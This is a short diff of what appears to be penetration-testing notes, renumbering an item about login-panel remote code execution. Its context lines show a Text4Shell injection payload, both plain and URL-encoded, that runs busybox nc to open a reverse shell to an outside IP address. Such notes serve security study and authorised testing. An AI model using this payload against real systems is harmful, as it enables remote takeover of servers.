@@ -43,7 +43,7 @@ Apache Commons Text 1.8 Dependency indicates vulnerable to text4shell [here](htt
 ${script:javascript:java.lang.Runtime.getRuntime().exec('busybox nc IP 443 -e /bin/bash')}
 %24%7Bscript%3Ajavascript%3Ajava%2Elang%2ERuntime%2EgetRuntime%28%29%2Eexec%28%27busybox%20nc%20192%2E168%2E45%2E206%20443%20%2De%20%2Fbin%2Fbash%27%29%7D
 ```
-6. Login panel with 0 day rce
+7. Login panel with 0 day rce
 ```
 For example,
 [vesta login panel](https://pentest.blog/vesta-control-panel-second-order-remote-code-execution-0day-step-by-step-analysis/)
